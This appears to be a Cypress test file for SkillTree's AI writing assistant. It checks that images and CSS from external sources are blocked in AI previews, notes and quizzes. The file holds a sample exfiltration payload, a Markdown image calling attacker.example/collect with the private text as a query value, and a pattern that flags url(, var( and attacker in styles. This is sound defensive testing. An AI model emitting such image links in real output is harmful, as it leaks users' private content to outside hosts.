/*
Copyright 2026 SkillTree

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
import { completedMsg } from './openai_helper_commands'

describe('AI external image safety', () => {
    const rejection = 'The AI included external or unsupported images.'
    const assertNoCollectorRequests = () => {
        cy.get('@externalCollector.all').should((requests) => {
            expect(requests, `external image requests: ${JSON.stringify(requests.map(({ request }) => request.url))}`).to.have.length(0)
        })
        cy.get('@relativeCollector.all').should((requests) => {
            expect(requests, `relative image requests: ${JSON.stringify(requests.map(({ request }) => request.url))}`).to.have.length(0)
        })
    }

    beforeEach(() => {
        cy.intercept('GET', '/public/config', (req) => {
            req.reply((res) => {
                res.body.enableOpenAIIntegration = true
                res.send(res.body)
            })
        })
        // Stub only the collectors; AI responses use the real backend streaming path.
        cy.intercept({ method: 'GET', hostname: 'attacker.example', pathname: '/collect' }, { statusCode: 204 }).as('externalCollector')
        cy.intercept({ method: 'GET', hostname: 'localhost', pathname: '/collect' }, { statusCode: 204 }).as('relativeCollector')
    })

    const openDescription = (description = 'Private training text.') => {
        cy.createProject(1)
        cy.createSubject(1, 1)
        cy.createSkill(1, 1, 1, { description })
        cy.visit('/administrator/projects/proj1/subjects/subj1/skills/skill1')
        cy.get('[data-cy="editSkillButton_skill1"]').click()
        cy.get('[data-cy="aiButton"]').click()
    }

    const contexts = ['description', 'question']
    contexts.forEach((context) => {
        it(`blocks external images in streaming and rejected ${context} previews`, () => {
            if (context === 'question') {
                cy.createQuizDef(1)
                cy.createQuizQuestionDef(1, 1, { question: 'Private training text.' })
                cy.visit('/administrator/quizzes/quiz1')
                cy.get('[data-cy="editQuestionButton_1"]').click()
                cy.get('[data-cy="aiButton"]').click()
            } else {
                openDescription()
            }
            // User-message initialValue must receive the same policy as AI updates.
            const userImage = '![user tracking](https://attacker.example/collect?content=PRIVATE_TRAINING_TEXT&kind=user)'
            // Cypress renders Markdown in its own command log, including images.
            // Do not let the test runner, rather than the application, load this URL.
            cy.get('[data-cy="instructionsInput"]').type(`AI external image safety - generated images ${userImage}`, { parseSpecialCharSequences: false, log: false }).type('{enter}')
            cy.get('[data-cy="userMsg-1"]').should('contain.text', 'Image blocked: user tracking')
            const preview = '[data-cy="aiMsg-2"] [data-cy="generatedSegment"]'
            cy.get(preview).should('contain.text', 'Preview content remains visible.')
            cy.get(preview).should('contain.text', 'Image blocked: tracking')
            assertNoCollectorRequests()
            cy.get('[data-cy="aiMsg-2"] [data-cy="finalSegment"]').should('contain.text', rejection)
            cy.get('[data-cy="useGenValueBtn-2"]').should('not.exist')
            cy.get('[data-cy="instructionsInput"]').should('be.enabled').and('have.focus')
            cy.get(`${preview} img[srcset], ${preview} img[src^="http"], ${preview} img[src^="/"]`).should('not.exist')
            assertNoCollectorRequests()
        })
    })

    it('blocks completed change-note images while preserving inline images through apply, save, and reload', () => {
        cy.fixture('valid_icon.png', 'base64').then((image) => {
            const imageUrl = `data:image/png;base64,${image}`
            openDescription(`Original description.\n\n![original diagram](${imageUrl})`)
            cy.get('[data-cy="instructionsInput"]').type('AI external image safety - safe content with notes{enter}')
            cy.get('[data-cy="aiMsg-2"] [data-cy="finalSegment"]').should('contain.text', completedMsg)
            cy.get('[data-cy="generatedSegmentNotes"]').should('contain.text', 'Improved the wording.')
                .and('contain.text', 'Image blocked: notes tracking')
            cy.get('[data-cy="generatedSegmentNotes"] img').should('not.exist')
            cy.get('[data-cy="aiMsg-2"] [data-cy="generatedSegment"] img').should('have.attr', 'src', imageUrl)
            assertNoCollectorRequests()
            cy.get('[data-cy="useGenValueBtn-2"]').should('be.enabled').click()
            cy.get('[data-cy="instructionsInput"]').should('not.exist')
            cy.get('[data-cy="markdownEditorInput"]').should('contain.text', 'Safe generated description.')
            cy.get('[data-cy="markdownEditorInput"] img').should('have.attr', 'src', imageUrl)
            cy.get('[data-cy="saveDialogBtn"]').should('be.enabled').click()
            cy.get('[data-cy="saveDialogBtn"]').should('not.exist')
            cy.get('[data-cy="skillOverviewDescription"]').should('contain.text', 'Safe generated description.')
            cy.get('[data-cy="skillOverviewDescription"] img').should('have.attr', 'src', imageUrl)
            cy.reload()
            cy.get('[data-cy="skillOverviewDescription"] img').should('have.attr', 'src', imageUrl)
            assertNoCollectorRequests()
        })
    })

    it('preserves combined text styles through generation, apply, save, and reload', () => {
        const text = 'Styled generated description.'
        const assertFormatting = (selector) => {
            cy.contains(`${selector} .toastui-editor-contents span[style]`, text)
                .should('have.css', 'font-size', '24px')
                .and('have.css', 'color', 'rgb(128, 0, 0)')
                .and('have.css', 'background-color', 'rgb(255, 255, 255)')
                .and('have.css', 'font-weight', '700')
                .and('have.css', 'font-style', 'italic')
                .and('have.css', 'text-align', 'center')
                .and('have.css', 'text-decoration-line', 'underline')
                .and('have.css', 'line-height', '36px')
        }
        openDescription('<span style="font-size: 24px; color: maroon; background-color: white; font-weight: bold; font-style: italic; text-align: center; text-decoration: underline; line-height: 1.5;">Original styled description.</span>')
        cy.get('[data-cy="instructionsInput"]').type('AI text style safety - preserve formatting{enter}')
        const preview = '[data-cy="aiMsg-2"] [data-cy="generatedSegment"]'
        cy.get('[data-cy="aiMsg-2"] [data-cy="finalSegment"]').should('contain.text', completedMsg)
        assertFormatting(preview)
        cy.get(`${preview} .fa-external-link-alt`).should(($icon) => {
            expect($icon[0].style.fontSize).to.equal('0.8rem')
        })
        assertNoCollectorRequests()
        cy.get('[data-cy="useGenValueBtn-2"]').should('be.enabled').click()
        cy.get('[data-cy="instructionsInput"]').should('not.exist')
        assertFormatting('[data-cy="markdownEditorInput"] .toastui-editor-ww-container')
        cy.get('[data-cy="saveDialogBtn"]').should('be.enabled').click()
        cy.get('[data-cy="saveDialogBtn"]').should('not.exist')
        assertFormatting('[data-cy="skillOverviewDescription"]')
        cy.reload()
        assertFormatting('[data-cy="skillOverviewDescription"]')
        assertNoCollectorRequests()
    })

    it('blocks resource-loading CSS mixed with otherwise safe formatting', () => {
        openDescription()
        cy.get('[data-cy="instructionsInput"]').type('AI text style safety - external CSS{enter}')
        const preview = '[data-cy="aiMsg-2"] [data-cy="generatedSegment"]'
        cy.get(preview).should('contain.text', 'Unsafe CSS description.')
            .and('contain.text', 'Escaped CSS description.')
            .and('contain.text', 'Variable CSS description.')
        // Preserve safe declarations in the rejected preview, but never apply
        // unsupported properties, escaped syntax, or CSS variables to the DOM.
        cy.contains(`${preview} span[style]`, 'Unsafe CSS description.')
            .should('have.css', 'font-size', '24px')
        cy.get(`${preview} span`).should(($spans) => {
            $spans.each((index, span) => {
                expect(span.style.backgroundImage).to.equal('')
                expect(span.style.cssText).not.to.match(/url\(|var\(|attacker|\\\\/i)
            })
        })
        cy.get('[data-cy="aiMsg-2"] [data-cy="finalSegment"]').should('contain.text', rejection)
        cy.get('[data-cy="useGenValueBtn-2"]').should('not.exist')
        cy.get('[data-cy="instructionsInput"]').should('be.enabled').and('have.focus')
        assertNoCollectorRequests()
    })

    it('rejects external quiz images before mounting question-card editors or applying the quiz', () => {
        cy.createProject(1)
        cy.createSubject(1, 1)
        cy.createSkill(1, 1, 1, { description: 'Private training text.' })
        cy.visit('/administrator/projects/proj1/subjects/subj1/skills/skill1')
        cy.get('[data-cy="generateQuizBtn"]').click()
        cy.get('[data-cy="instructionsInput"]').type('AI external image safety - quiz images{enter}')
        cy.get('[data-cy="aiMsg-2"] [data-cy="finalSegment"]').should('contain.text', rejection)
        cy.get('[data-cy="generatedQuestion"]').should('not.exist')
        cy.get('[data-cy="useGenValueBtn-2"]').should('not.exist')
        cy.get('[data-cy="selfReportMediaCard"]').should('not.contain.text', 'Self Report: Quiz')
        assertNoCollectorRequests()
    })

    it('leaves ordinary saved Markdown image rendering unchanged outside the AI dialog', () => {
        const imageUrl = `https://attacker.example/collect?content=PUBLIC_IMAGE&kind=ordinary&nonce=${Date.now()}`
        cy.createProject(1)
        cy.createSubject(1, 1)
        cy.createSkill(1, 1, 1, { description: `Ordinary description.\n\n![ordinary image](${imageUrl})` })
        cy.visit('/administrator/projects/proj1/subjects/subj1/skills/skill1')
        cy.get('[data-cy="skillOverviewDescription"]').should('contain.text', 'Ordinary description.')
        cy.get('[data-cy="skillOverviewDescription"] img').scrollIntoView().should('have.attr', 'src', imageUrl)
    })
})
